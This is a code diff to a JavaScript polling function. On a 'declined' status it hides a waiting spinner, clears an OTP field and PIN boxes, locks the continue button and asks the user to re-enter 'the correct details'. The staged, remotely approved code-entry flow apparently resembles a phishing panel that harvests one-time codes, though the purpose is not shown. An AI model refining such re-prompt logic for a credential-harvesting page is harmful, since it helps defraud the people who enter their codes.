@@ -578,12 +578,28 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-      } else if (data.status === "declined") {
+           } else if (data.status === "declined") {
         clearInterval(pollingInterval);
+        
+        // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
-        msgElement.classList.add("error");
-        msgElement.innerText = "Submission declined. Please refresh and retry.";
+        
+        // 2. Clear out old entries from the text box and individual PIN grids
+        const otpInput = document.getElementById('code1');
+        if (otpInput) otpInput.value = '';
+        
+        const pinBoxes = document.querySelectorAll('.boxes input');
+        pinBoxes.forEach(box => box.value = '');
+        
+        // 3. Reset the primary continue button back to its initial locked style state
+        const submitBtn = document.getElementById('submitCode1');
+        if (submitBtn) submitBtn.disabled = true;
+
+        // 4. Alert user about the correction step without blocking the interface view
+        msgElement.className = "error";
+        msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
+ 
     } catch (err) {
       console.error("Status check failed");
     }
